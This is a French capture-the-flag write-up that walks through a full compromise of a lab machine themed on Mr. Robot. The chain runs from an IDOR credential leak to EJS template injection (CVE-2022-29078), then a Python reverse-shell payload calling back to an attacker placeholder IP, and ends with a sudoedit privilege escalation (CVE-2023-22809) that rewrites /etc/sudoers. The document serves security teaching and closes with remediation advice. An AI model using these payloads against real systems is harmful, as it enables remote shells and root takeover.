# Whiterose — Rapport d’exploitation
**Room :** Whiterose  
**Difficulté :** Facile  
**Description :** Scénario d’intrusion web et système inspiré de la série Mr. Robot.

# Objectifs pédagogiques
Cette machine permet de mettre en œuvre plusieurs concepts fondamentaux en test d’intrusion :
- Énumération de services réseau
- Contrôles d’accès défaillants (IDOR)
- Server-Side Template Injection (EJS)
- Exécution de code arbitraire (Node.js / Express)
- Élévation de privilèges Linux via sudoedit (CVE)

**⚠️ Ce rapport est fourni à des fins éducatives uniquement.**  
Toute exploitation de vulnérabilités doit être réalisée dans un cadre légal et autorisé.

# Résumé exécutif

Ce rapport décrit l’exploitation complète d’un scénario d’intrusion menant d’une surface web exposée à une compromission totale du système.

L’objectif est de démontrer une chaîne d’attaque réaliste menant d’une surface web exposée à une compromission totale du système.

### Chaîne d’exploitation :  
IDOR → compromission d'un compte administrateur → SSTI (EJS) → RCE → élévation de privilèges Linux.

### Public visé : 
Pentester junior / Blue team / Développeur backend.

# Outils utilisés
- Nmap
- Gobuster / fuzzing de virtual hosts
- Burp Suite
- Netcat
- Python
- sudo

# 1. Reconnaissance

Après le déploiement de la machine cible et la connexion au réseau via OpenVPN, une phase de reconnaissance est initiée afin d’identifier la surface d’attaque exposée.

### Objectif  
- Identifier les ports ouverts
- Déterminer les services accessibles
- Obtenir des informations sur l’OS et les technologies utilisées

### Scan réseau : 
``` bash
nmap -A -p- -T4 IP_CIBLE
```

### Explication des options
- `-A` : mode agressif (OS detection, traceroute, scripts avancés)
- `-p-` : scan de tous les ports (1–65535)
- `-T4` : accélère le scan
- `IP_CIBLE` : adresse IP de la machine cible

![image](https://github.com/user-attachments/assets/6f175acf-1064-4fba-8dec-4ef9ee972cd2)

### Analyse des services exposés
| Port | Service | Description                       |
| ---- | ------- | --------------------------------- |
| 22   | SSH     | Accès distant (post-exploitation) |
| 80   | HTTP    | Serveur web nginx 1.14.0          |

### Accès au site

L’accès au port 80 redirige vers le nom de domaine `cyprusbank.thm`.

➡️ Ajout dans /etc/hosts :  
`<IP_CIBLE> cyprusbank.thm`


Le site affiche une page de maintenance.
![image](https://github.com/user-attachments/assets/b5138eab-3ff2-4da3-b4bf-76b9c35f9e3e)

Analyse rapide côté client:
- Aucun script JavaScript
- Aucun commentaire HTML
- Pas de page robots.txt
- Peu de ressources chargées
- Aucun résultat intéressant avec une énumération `Gobuster dir`

➡️ Hypothèse : présence d’un sous-domaine non exposé

# 2. Énumération

### Recherche de Vhosts

Une énumération des virtual hosts (Host header fuzzing) avec `Gobuster vhost` est réalisée afin d’identifier d’éventuels sous-domaines hébergés sur le serveur web.

![image](https://github.com/user-attachments/assets/a3968b74-90c4-4fa5-8e24-3e210ca359f4)

L'énumération des virtual hosts révèle : `admin.cyprusbank.thm`

➡️ Ajout dans /etc/hosts puis navigation vers le sous-domaine : 
`<IP_CIBLE> cyprusbank.thm admin.cyprusbank.thm`

# 3. Accès à l’interface d’administration

Le sous-domaine admin.cyprusbank.thm expose une page de connexion.

![image](https://github.com/user-attachments/assets/b4c265e3-cdf4-499e-95bd-ed4e43cbc23d)

Des identifiants utilisateurs sont disponibles :  
```
Utilisateur : Olivia Cortez 
Mot de passe : olivi8
```

L’authentification est réussie, mais l’accès est restreint :
- certaines fonctionnalités, notamment l’endpoint /settings, sont inaccessibles
- les privilèges semblent limités à un rôle utilisateur standard

![image](https://github.com/user-attachments/assets/9ff1c639-4c06-4f7a-a766-c5745ea205c7)

# 4. IDOR – Accès à des données sensibles

En accédant à l’endpoint suivant :  
`/messages/?c=5`

On observe la présence d’un paramètre `c` utilisé pour identifier des messages.

### Test de contrôle d’accès

En modifiant la valeur du paramètre :
`/messages/?c=20`

l’application retourne davantage de messages, sans vérifier que l’utilisateur authentifié est autorisé à y accéder.

![image](https://github.com/user-attachments/assets/58700f39-3a1c-4d07-a361-1ebd86364d0f)

### Résultat :
Cette manipulation permet l’accès à d'autres messages révélant des données sensibles appartenant à d’autres utilisateurs, notamment des identifiants de connexion.

```
Utilisateur : Gayle Bev 
Mot de passe : REDACTED
```

**Impact sécurité :**  
Cette vulnérabilité de type Insecure Direct Object Reference (IDOR) permet à un utilisateur authentifié d’accéder à des ressources qui ne lui appartiennent pas, entraînant une fuite d’informations sensibles, une compromission potentielle de comptes à privilèges élevés et un élargissement de la surface d’attaque.

# 5. Compte administrateur & surface d’attaque élargie

Les identifiants divulgués via l’IDOR permettent l’accès à un compte disposant de privilèges administrateur, ce qui élargit considérablement la surface d’attaque côté serveur.

Cet accès donne notamment :
- la possibilité de modifier les mots de passe utilisateurs
- l’accès à l’endpoint `/settings`

Les données saisies dans les formulaires sont réinjectées dans la réponse HTML côté serveur, ce qui constitue un indicateur fort de rendu dynamique via un moteur de templates.

➡️ Hypothèse : présence d’une vulnérabilité de type Server-Side Template Injection (SSTI).

![image](https://github.com/user-attachments/assets/8469acb1-dd86-441b-807c-0183bded15f0)

# 6. Server-Side Template Injection (SSTI)

À l’aide de Burp Suite, une requête de modification de mot de passe est interceptée et modifiée.

![image](https://github.com/user-attachments/assets/edacb276-9c6d-4cbf-99d3-4f95f873bd86)

### Analyse de l’erreur serveur

En supprimant le paramètre `password`, le serveur retourne une erreur interne accompagnée d’une stack trace complète.

![image](https://github.com/user-attachments/assets/38d92b8e-ac37-4116-876d-28deec32b163)


``` text
HTTP/1.1 500 Internal Server Error  
Server: nginx/1.14.0 (Ubuntu)  
Date: Sat, 03 Jan 2026 14:06:54 GMT  
Content-Type: text/html; charset=utf-8  
Content-Length: 1632  
Connection: keep-alive  
X-Powered-By: Express  
Content-Security-Policy: default-src 'none'  
X-Content-Type-Options: nosniff  

ReferenceError: /home/web/app/views/settings.ejs:14
  12| <div class="alert alert-info mb-3"><%= message %></div>
  13| <% } %>
>>14| <% if (password != -1) { %>
  15| <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
  16| <% } %>
  17| <% if (typeof error != 'undefined') { %>

password is not defined
  at eval ("/home/web/app/views/settings.ejs":27:8)
  at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
  at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
  at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
  at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
  at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
  at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
  at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
  at /home/web/app/routes/settings.js:27:7
  at runMicrotasks (<anonymous>)
```

Informations divulguées
- Backend : Node.js / Express
- Moteur de templates : EJS
- Chemins internes du serveur
- Logique applicative

Cette divulgation confirme :
- une mauvaise gestion des erreurs
- un risque élevé d’exploitation SSTI

➡️ Confirmation d’une vulnérabilité exploitable menant à une exécution de code arbitraire.

# 7. Validation de la SSTI → RCE (CVE-2022-29078)

L’exploitation est rendue possible par une mauvaise configuration d’Express exposant les `view options`, combinée à l’utilisation du moteur EJS.

Cette configuration vulnérable est documentée, notamment dans le cadre de CVE-2022-29078 :
- https://github.com/mde/ejs/issues/720
- https://eslam.io/posts/ejs-server-side-template-injection-rce/

### Payload de validation
``` text
settings[view options][outputFunctionName]=x;
process.mainModule.require('child_process')
.execSync('whoami');
s
```

<!--
![image](https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad)
# A modifier!
-->

➡️ Le résultat de la commande est renvoyé côté serveur, confirmant l’exécution de code arbitraire.  
✅ Exécution de commandes confirmée

**Impact sécurité :**  
Cette vulnérabilité permet à un attaquant authentifié d’exécuter des commandes arbitraires sur le serveur, entraînant une compromission complète de l’application et du système sous-jacent.

# 8. Obtention d’un reverse shell

L’exécution de commandes arbitraires via la SSTI EJS permet l’établissement d’un reverse shell via Python, sans dépôt de fichier sur la machine cible.

### Payload utilisé

``` text
settings[view options][outputFunctionName]=x;
process.mainModule.require('child_process')
.execSync(
"python3 -c 'import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\"IP_ATTAQUANT\", 1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
pty.spawn(\"sh\")'"
);
```

Cette technique suppose la présence de Python3 sur la machine cible, ce qui est courant sur de nombreuses distributions Linux.

Ce payload ouvre une connexion TCP vers la machine attaquante, redirige les entrées/sorties standard vers le socket, puis ouvre un shell interactif via `pty`, assurant une session stable.

➡️ Un shell interactif est obtenu et stabilisé.

<!--
![image](https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d)
A modifier
-->

**Impact sécurité :**  
L’exécution de commandes arbitraires permet à un attaquant d’obtenir un accès interactif au système,
ouvrant la voie au vol de données, à l’installation de portes dérobées et à une élévation de privilèges.

# 9. Accès utilisateur & flag user

Utilisateur courant : web

Le flag utilisateur est localisé dans : `/home/web/user.txt`

# 10. Élévation de privilèges – sudoedit (CVE-2023-22809)

### Analyse sudo
La commande `sudo -l` liste tout ce que l’utilisateur web peut exécuter avec sudo. 

![image](https://github.com/user-attachments/assets/549edde0-3acd-4571-ae35-6f200a31c15f)

Résultat :
- l’utilisateur web peut modifier un fichier de configuration Nginx via sudoedit
- aucun mot de passe n’est requis

Version de sudo :
`sudo 1.9.12p1`

➡️ Cette version est vulnérable à CVE-2023-22809.

# 11. Exploitation de sudoedit (sudo -e)

Cette vulnérabilité permet à un utilisateur disposant d’un accès sudoedit limité de modifier arbitrairement des fichiers système en tant que root.

### Principe
La vulnérabilité CVE-2023-22809 affecte la commande sudoedit et permet à un utilisateur disposant d’un accès sudoedit restreint de modifier arbitrairement des fichiers système avec les privilèges root.

Cette faille repose sur la possibilité de définir des variables d’environnement telles que EDITOR, VISUAL ou SUDO_EDITOR avec des arguments supplémentaires.
En injectant l’argument --, il est possible de contourner les restrictions imposées par sudoedit et d’ouvrir des fichiers autres que ceux explicitement autorisés par la configuration sudo.

Dans ce contexte, l’utilisateur web étant autorisé à utiliser sudoedit en tant que root, cette vulnérabilité permet la modification de fichiers critiques du système, notamment /etc/sudoers, menant à une élévation de privilèges complète.

Plus d'informations détaillées à ce sujet dans cet avis de sécurité publié par Synacktiv (https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)

### Exploitation

``` bash
export EDITOR="nano -- /etc/sudoers"
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Le fichier `/etc/sudoers` est alors modifiable.

En ajoutant `web ALL=(ALL) NOPASSWD: ALL` au fichier, l’utilisateur courant obtient des privilèges sudo complets.

![image](https://github.com/user-attachments/assets/36834f4c-cb6c-482a-ab68-5c0862ba3af7)

**Impact sécurité :**  
La mauvaise configuration de sudo, combinée à une version vulnérable, permet une élévation de privilèges locale menant à un accès root complet sur la machine.

# 12. Accès root

Les nouveaux privilèges permettent l’obtention d’un shell root :  
`sudo su -`

Le flag root est accessible dans :  
`/root/root.txt`

# Conclusion & compétences démontrées

### Vulnérabilités exploitées
- IDOR
- SSTI (EJS / Express) → RCE (CVE-2022-29078)
- Mauvaise configuration sudo
- CVE-2023-22809 (sudoedit)

### Compétences mises en avant
- Méthodologie de test d’intrusion
- Exploitation web
- Analyse de stack traces
- Exploitation Node.js
- Élévation de privilèges Linux

### Recommandations de sécurité
- Implémenter des contrôles d’accès côté serveur
- Restreindre l’exposition des view options d’Express
- Désactiver les stack traces en production
- Mettre à jour sudo et limiter l’usage de sudoedit